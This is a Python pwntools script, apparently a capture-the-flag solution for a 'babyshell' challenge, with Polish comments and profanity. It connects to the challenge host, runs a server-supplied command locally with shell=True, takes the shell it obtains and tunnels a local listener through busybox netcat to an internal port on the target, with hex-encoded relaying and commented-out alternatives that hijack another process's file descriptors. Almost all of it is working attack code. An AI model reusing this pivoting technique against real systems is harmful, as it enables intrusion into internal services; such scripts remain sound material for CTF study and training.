from pwn import remote, listen
import subprocess
import threading
import time


def pprint(line):
    print(line.decode('utf8').rstrip())


def read_at_least_raw(sock, cunt):
    res = b''
    while len(res) < cunt:
        res += sock.recv(1)
    return res


def read_at_least(sock, cunt):
    res = b''
    while len(res) < cunt:
        res += bytes.fromhex(read_at_least_raw(sock, 4)[:2].decode('utf-8'))
        print('odczytaned', len(res))
    return res


def main():
    r = remote('babyshell.hackable.software', 1337)
    line = r.recvline()
    cmd = line.decode().split(': ')[1].rstrip()
    print(cmd)
    out = subprocess.run(cmd, stdout=subprocess.PIPE, shell=True)
    r.send(out.stdout)
    print('Connected!')

    while True:
        line = r.readline()
        pprint(line)
        if b'/etc/motd.' in line:
            break

    pprint(r.readline())
    pprint(r.recv())  # shell should be here

    print('spanko')
    time.sleep(5)

    # r.interactive()

    r.send('stty -echo\n')

    pprint(r.readline())  # echo
    pprint(r.recv())  # prompt

    r.send('/bin/busybox nc -vz 127.0.0.1 4433 2>&1\n')

    pprint(r.readline())  # output
    pprint(r.recv())  # prompt

    print('Listening!')

    l = listen(4321)

    def read_thread():
        while True:
            data = l.recv()
            print('L', data)
            r.send(''.join('\\\\x{:02x}'.format(b) for b in data).encode('utf8') + b'\n')
            # r.send(base64.b64encode(data + b'\x04\x04') + b'\x04\x04')

    print("starting thread")
    x = threading.Thread(target=read_thread)
    x.start()

    print("sending payload")

    r.send(b'(while true; do read s; printf "$s"; done) | /bin/busybox nc -v 127.0.0.1 4433 2>&1 | xxd -pc1;\r\n')
    # r.send(b'stty raw && (while true; do base64 -d; done) | /bin/busybox nc -w 0 127.0.0.1 4433 \n')
    # r.send(b'(while true; do base64 -d; done) | cat - | /bin/busybox nc 127.0.0.1 4433\n')
    # r.send(b'setsid /bin/busybox nc 127.0.0.1 4433 </proc/712/fd/10 >/proc/712/fd/10\n')
    # r.interactive()

    counter = 0
    while True:
        if counter == 0:
            data = read_at_least(r, 32)
        elif counter == 1:
            data = read_at_least(r, 1253)
            print('odczytaned')
            print(len(data))
        elif counter == 2:
            data = read_at_least(r, 239)
        elif counter == 3:
            data = read_at_least(r, 239)
        elif counter == 4:
            data = read_at_least(r, 24)
        elif counter == 5:
            data = read_at_least(r, 78)
        elif counter == 6:
            data = read_at_least(r, 24)
        else:
            print('co do kurwy XD')
            break
        # data = r.recv()
        if len(data) > 0 and b'127.0.0.1' not in data:
            print('R', data)
            l.send(data)
        counter += 1


if __name__ == '__main__':
    main()
